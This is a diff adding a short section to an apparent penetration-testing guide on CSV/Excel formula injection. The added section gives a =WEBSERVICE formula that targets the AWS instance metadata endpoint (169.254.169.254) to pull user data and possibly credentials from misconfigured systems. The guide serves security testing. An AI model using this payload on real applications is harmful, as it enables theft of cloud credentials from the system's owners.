@@ -37,6 +37,11 @@ Any formula can be started with
 @
 ```
 
+### Special Considerations
+When it appears the application you are testing is processing the CSV/Excel documents, it may be possible to combine
+the formula injection with use of the `=WEBSERVICE("http://169.254.169.254/latest/user-data")` call to obtain sensitive information. Such as in the case of AWS
+systems you could possibly obtain the AWS credentials via http://169.254.169.254/latest/user-data endpoint if not configured properly.
+
 ## References
 
 * [OWASP - CSV Excel Macro Injection](https://owasp.org/index.php/CSV_Excel_Macro_Injection)
